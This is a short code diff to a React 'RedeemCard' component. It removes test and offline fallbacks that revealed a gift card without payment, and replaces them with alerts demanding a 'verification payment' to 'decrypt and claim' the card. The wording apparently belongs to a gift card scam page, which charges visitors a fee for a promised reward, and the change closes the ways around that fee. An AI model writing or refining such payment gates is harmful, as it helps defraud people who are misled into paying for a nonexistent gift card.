@@ -94,17 +94,13 @@ const RedeemCard = () => {
                     triggerCardRevealAnimation();
                 },
                 onClose: function () {
-                    // Sandbox bypass fallback
-                    const testOverride = confirm('Payment closed. For testing and preview purposes, would you like to simulate a successful sandbox payment?');
-                    if (testOverride) {
-                        triggerCardRevealAnimation();
-                    }
+                    // Stop and tell the user the payment was unsuccessful
+                    alert('❌ Verification payment was unsuccessful or cancelled. Please complete the payment to securely decrypt and claim your gift card.');
                 }
             });
             handler.openIframe();
         } else {
-            // Local dev fallback if script loading was blocked or offline
-            triggerCardRevealAnimation();
+            alert('❌ Secure Payment Gateway could not be initialized. Please check your network connection and try again.');
         }
     };
 
